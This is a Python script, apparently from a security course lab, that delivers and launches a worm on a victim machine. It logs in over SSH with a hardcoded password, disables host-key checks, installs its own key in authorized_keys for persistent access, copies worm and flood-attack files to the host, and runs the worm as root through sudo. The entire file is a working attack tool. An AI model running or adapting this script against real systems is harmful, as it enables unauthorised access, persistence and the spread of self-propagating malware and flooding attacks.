import os
import sys

victim, attacker = {}, {}
NO_AUTHENTICATION = '-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
WITH_PRIVATE_KEY = '-i ~/.ssh/victim_key'


def set_up_ssh_key():
    print('[Set up ssh key]')

    # Create ssh key
    command = 'ssh-keygen -f ~/.ssh/victim_key -q -N \"\"'
    os.system(command)

    send_scp_command('~/.ssh/victim_key.pub', '~/.ssh/')

    # Concatenate public key to authorized keys
    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys && ( chmod 600 ~/.ssh/authorized_keys )'
    send_ssh_command(command)


def send_worm_to_victim():
    print('[Send worm to the victim]')

    # Pass worm to the victim
    command = 'mkdir /home/{0}/Worm_Attack'.format(victim['name'])
    send_ssh_command(command, isNeedPw=False)

    sendFiles = ['Worm.py', 'Launch_Attack.py', 'SetUp_Attack.py', 'TA_Flood_Attack']
    for sendFile in sendFiles:
        send_scp_command(sendFile, '/home/{0}/Worm_Attack'.format(victim['name']), isNeedPw=False)


def send_ssh_command(command, isNeedPw=True):
    privateKey = '' if isNeedPw else WITH_PRIVATE_KEY

    sshCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
    sshCommand += 'ssh -t {0}@{1} -p {2} {3} {4} \"{5}\"'.format(victim['name'], victim['ip'], victim['port'], NO_AUTHENTICATION, privateKey, command)

    print('[Send SSH Command] ' + sshCommand)
    os.system(sshCommand)


def send_scp_command(sendFile, directory, isNeedPw=True):
    privateKey = '' if isNeedPw else WITH_PRIVATE_KEY

    scpCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
    scpCommand += 'scp -P {0} {1} {2} {3} {4}@{5}:{6}'.format(victim['port'], NO_AUTHENTICATION, privateKey, sendFile, victim['name'], victim['ip'], directory)

    print('[Send SCP Command] ' + scpCommand)
    os.system(scpCommand)


def set_up_user():
    print('[Victim]')
    victim['ip'] = raw_input('ip: ')
    victim['port'] = int(raw_input('port: '))
    victim['name'] = 'victim'
    victim['password'] = 'victim'

    attacker['name'] = 'cs2019'
    attacker['password'] = 'cs2019'


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':
    if is_root():
        sys.exit('Do not run the script with \'sudo\'')

    set_up_user()

    # Check ssh key if exists
    if not os.path.isfile('/home/{0}/.ssh/victim_key'.format(attacker['name'])):
        set_up_ssh_key()

        send_worm_to_victim()

        print('[Start the Worm]')
        # Start the Worm
        command = 'cd /home/{0}/Worm_Attack && (echo {1} | sudo -S python Worm.py )'.format(victim['name'], victim['password'])
        send_ssh_command(command, isNeedPw=False)

    else:
        send_worm_to_victim()

        print('[Reset the Worm]')
        # Set up attack module
        command = 'cd /home/{0}/Worm_Attack && ( python SetUp_Attack.py )'
        send_ssh_command(command, isNeedPw=False)
